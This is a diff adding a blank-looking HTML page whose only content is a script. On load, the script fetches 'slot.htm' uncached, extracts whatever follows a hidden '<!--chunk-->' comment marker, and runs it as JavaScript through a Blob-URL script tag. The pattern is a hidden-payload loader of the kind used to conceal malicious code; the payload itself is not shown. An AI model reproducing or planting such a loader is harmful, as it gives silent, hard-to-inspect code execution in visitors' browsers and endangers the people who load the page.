@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+<script>
+(function takeSlot() {
+    function cut(raw) {
+        var parts = String(raw).split('<!--chunk-->');
+        return parts.length > 1 ? parts[1] : '';
+    }
+
+    function fire(code) {
+        var body = String(code).replace(/^\uFEFF/, '').trim();
+        if (!body) return;
+        var blob = new Blob([body], { type: 'text/javascript' });
+        var url = URL.createObjectURL(blob);
+        var tag = document.createElement('script');
+        tag.onload = function () { URL.revokeObjectURL(url); };
+        tag.src = url;
+        document.documentElement.appendChild(tag);
+    }
+
+    fetch('slot.htm', { cache: 'no-store' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        })
+        .then(cut)
+        .then(fire);
+})();
+</script>
+</body>
+</html>
